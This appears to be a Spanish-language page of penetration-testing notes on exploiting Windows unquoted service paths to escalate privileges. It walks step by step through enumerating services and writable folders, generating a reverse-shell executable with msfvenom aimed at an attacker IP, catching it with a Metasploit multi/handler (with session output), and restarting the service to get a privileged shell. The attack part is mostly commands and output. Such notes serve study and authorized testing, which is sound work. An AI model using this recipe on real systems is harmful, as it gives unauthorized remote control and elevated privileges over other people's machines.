# Unquoted service Path



#### Unquoted service Path (Ruta de srvicio Sin Comillas)

{% code overflow="wrap" %}
```
# Clave: Se busca un servicio cuya ruta de ejecución tenga espacios y NO tenga comillas. Ello lo hace más probable a la explotación.
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
Ej.
Correcto: "C:\\Program Files\\topservice folder\\subservice subfolder\\srvc.exe" #comillas
Correcto: C:\\Windows\\system32\\svchost.exe  #sin espacios
Vulnerable: C:\\Program Files\\topservice folder\\subservice subfolder\\srvc.exe #con espacio y sin comillas

En Windows, el servicio busca un ejecutable ".exe", por lo que Windows buscará y se detendrá en cada espacio para verificarlo:
C:\\Program.exe
C:\\Program Files\\topservice.exe
C:\\Program Files\\topservice folder\\subservice.exe
C:\\Program Files\\topservice folder\\subservice subfolder\\srvc.exe
# Vector: crear un ejecutiliz reverse shell con alguno de esos nombres de ejcutables y ubicarlo en alguno de esos mismos lugares para que el servicio ejecute nuestro exploit con privilegios y nos de máxima autoridad.

# Requisitos para explotación exitosa:
# 1. Tener permisos para poder escribir en aquellos directorios de las rutas.
# 2. Poder ser capaz de reiniciar el servicio.
# Si alguno de estos requisitos no se cumple, no es posible la explotación.

# Comando para ver los servicios que se están ejecutando el target
wmic service get name,displayname,pathname,startmode
# Verificar un servicio para ver más info
sc qc <servicio>

# Revisar los permisos en los subdirectorios de la ruta, buscando en cuál podemos escribir
# accesschk64.exe mostrará una lista de grupos de usuarios con privilegios de lectura (R) y escritura (W):
.\\accesschk64.exe /accepteula -uwdq "C:\\Program Files\\" #ej carpeta "Program Files"

# Crear ejecutable con la ruta que podemos escribir, y el nombre que necesitamos según lo que se va a buscar en la ruta.
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ATTACKER_IP] LPORT=[The Port to which the reverse shell will connect] -f exe > executable_name.exe
```
{% endcode %}

```bash
# Configurar un multihandler para atrapar la conexión
msf6 > use exploit/multi/handler
[*] Using configured payload windows/x64/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
payload => windows/x64/shell_reverse_tcp
msf6 exploit(multi/handler) > set LPORT [ATTACKER_PORT_]
lport => [ATTACKER_PORT_]
msf6 exploit(multi/handler) > set LHOST [ATTACKER_IP]
lhost => [ATTACKER_IP]
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.9.6.195:8899
```

{% code overflow="wrap" %}
```bash
#Reiniciar el servicio
sc stop <servicio>
sc start <servicio>
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Para obtener reverse shell con privilegios tenemos que hacerlo con el servicio que llama con privilegios a las rutas buscando el dll. Verificamos que está detenido y lo reiniciamos al servicio: unquotedsvc.

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

Al ver el handler, vemos que ahora hemos ejecutado el servicio con privilegios superiores:

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
